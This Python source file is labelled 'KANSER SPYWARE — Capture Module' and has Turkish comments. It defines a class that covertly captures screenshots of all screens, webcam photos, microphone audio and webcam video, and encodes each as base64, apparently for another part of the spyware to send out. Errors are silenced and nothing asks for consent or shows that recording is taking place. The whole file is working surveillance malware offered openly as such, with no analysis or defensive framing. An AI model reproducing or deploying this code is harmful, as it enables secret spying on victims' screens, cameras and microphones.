#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KANSER SPYWARE — Capture Module
Screen + Webcam + Microphone
"""
import os, io, base64, tempfile, time

class Capture:
    def screenshot(self):
        """Ekran goruntusu al — JPEG base64"""
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab(all_screens=True)
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=30)
            return base64.b64encode(buf.getvalue()).decode()
        except:
            try:
                import mss
                with mss.mss() as sct:
                    monitor = sct.monitors[1]
                    img = sct.grab(monitor)
                    from PIL import Image
                    pil_img = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
                    buf = io.BytesIO()
                    pil_img.save(buf, format="JPEG", quality=30)
                    return base64.b64encode(buf.getvalue()).decode()
            except: return None

    def webcam(self):
        """Webcam fotografi"""
        try:
            import cv2
            import numpy as np
            cam = cv2.VideoCapture(0)
            if not cam.isOpened(): return None
            ret, frame = cam.read()
            cam.release()
            if not ret: return None
            _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 40])
            return base64.b64encode(buf.tobytes()).decode()
        except: return None

    def mic(self, duration=5):
        """Mikrofon kaydi (5sn default)"""
        try:
            import pyaudio, wave
            CHUNK, FORMAT, CHANNELS, RATE = 1024, 8, 1, 22050
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
            frames = [stream.read(CHUNK) for _ in range(0, int(RATE / CHUNK * duration))]
            stream.stop_stream(); stream.close(); p.terminate()
            buf = io.BytesIO()
            wf = wave.open(buf, "wb")
            wf.setnchannels(CHANNELS); wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE); wf.writeframes(b"".join(frames)); wf.close()
            return base64.b64encode(buf.getvalue()).decode()
        except: return None

    def record_video(self, duration=10):
        """Webcam video kaydi"""
        try:
            import cv2
            cam = cv2.VideoCapture(0)
            if not cam.isOpened(): return None
            fourcc = cv2.VideoWriter_fourcc(*"avc1")
            fp = os.path.join(tempfile.gettempdir(), f"vid_{int(time.time())}.mp4")
            w, h = int(cam.get(3)), int(cam.get(4))
            out = cv2.VideoWriter(fp, fourcc, 10.0, (w, h))
            start = time.time()
            while time.time() - start < duration:
                ret, frame = cam.read()
                if ret: out.write(frame)
            cam.release(); out.release()
            with open(fp, "rb") as f: data = base64.b64encode(f.read()).decode()
            os.remove(fp)
            return data
        except: return None

if __name__ == "__main__":
    c = Capture()
    ss = c.screenshot()
    print(f"Screenshot: {len(ss) if ss else 0} bytes")
    wc = c.webcam()
    print(f"Webcam: {len(wc) if wc else 0} bytes")
